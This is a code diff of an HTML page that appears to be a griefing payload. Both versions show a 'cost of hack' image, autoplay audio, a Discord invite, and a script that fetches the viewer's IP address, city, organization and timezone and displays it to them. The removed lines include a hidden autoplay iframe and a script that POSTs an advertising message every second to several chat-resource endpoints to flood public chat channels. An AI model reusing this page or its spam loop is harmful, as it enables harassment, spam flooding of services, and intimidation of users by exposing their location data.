@@ -45,16 +45,12 @@
 </head>
 <body>
     <div class="image-container">
-        <img src="https://www.productivecorp.com/wp-content/uploads/2019/01/cost-of-hack.jpg" alt="Discord Image">
+        <img src="https://cdn.discordapp.com/attachments/1397411820565823648/1402284980025167904/cost-of-hack.png?ex=68935b28&is=689209a8&hm=891a948a198bc9b2fc5099c631fc3a9a2bce04c09818e23122e139e82b32b035&" alt="Discord Image">
     </div>
-
-    <!-- Hidden YouTube audio -->
-    <div style="width:0; height:0; overflow:hidden;">
-        <iframe width="0" height="0" 
-            src="https://www.youtube.com/embed/JxXnP-IW5O8?autoplay=1&loop=1&playlist=JxXnP-IW5O8" 
-            frameborder="0" allow="autoplay"></iframe>
-    </div>
-
+    <audio autoplay loop>
+        <source src="https://www.youtube.com/embed/grUgzdVrcLU?autoplay=1&loop=1&playlist=grUgzdVrcLU" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
     <div class="info" id="ip-info">
         <strong>IP: <span id="ip"></span></strong><br>
         <span><strong>City:</strong> <span id="city"></span></span><br>
@@ -64,62 +60,16 @@
         <span><strong>Organization:</strong> <span id="org"></span></span><br>
         <span><strong>Timezone:</strong> <span id="timezone"></span></span>
     </div>
-
     <div class="text">discord.gg/HNTest</div>
 
     <script>
-        // Fetch IP info and display
-        fetch('https://ipinfo.io/json?token=your_token_if_needed')
+         fetch('https://ipinfo.io/json')
         .then(response => response.json())
         .then(data => {
-            document.getElementById('ip').textContent = data.ip || '';
-            document.getElementById('city').textContent = data.city || '';
-            document.getElementById('region').textContent = data.region || '';
-            document.getElementById('country').textContent = data.country || '';
-            document.getElementById('loc').textContent = data.loc || '';
-            document.getElementById('org').textContent = data.org || '';
-            document.getElementById('timezone').textContent = data.timezone || '';
+            delete data.readme;
+            const infoDiv = document.getElementById('ip-info');
+            infoDiv.textContent = JSON.stringify(data, null, 2);
         });
-
-        // Spam fetch script
-        const msg = `👑 HN & Navy - .gg/HNTESTING ! 👑`;
-        const body = JSON.stringify({ message: msg });
-
-        setInterval(() => {
-            fetch("https://flix-scripts/chatResult", { method: "POST", body });
-
-            fetch("https://danger_chat/Danger_Chat:SendMessage", {
-                method: "POST",
-                body: JSON.stringify({
-                    message: msg,
-                    channel: "شات العام",
-                    color: null,
-                    isImageAndLinksAllowed: [false, false]
-                })
-            });
-
-            fetch("https://easy-chat+/o6ZbK5Ecp6", {
-                headers: {
-                    accept: "*/*",
-                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
-                },
-                body: JSON.stringify({ message: msg, channel: "شات العام" }),
-                method: "POST"
-            });
-
-            fetch("https://melix_chat/chatResult", { method: "POST", body });
-            fetch("https://as_chat/chatResult", { method: "POST", body });
-            fetch("https://chat/chatResult", { method: "POST", body });
-
-            fetch("https://ho-chatv2/Chat", {
-                method: "POST",
-                body: JSON.stringify({
-                    Type: "chatResult",
-                    message: msg,
-                    chatType: "general"
-                })
-            });
-        }, 1000);
     </script>
 </body>
 </html>
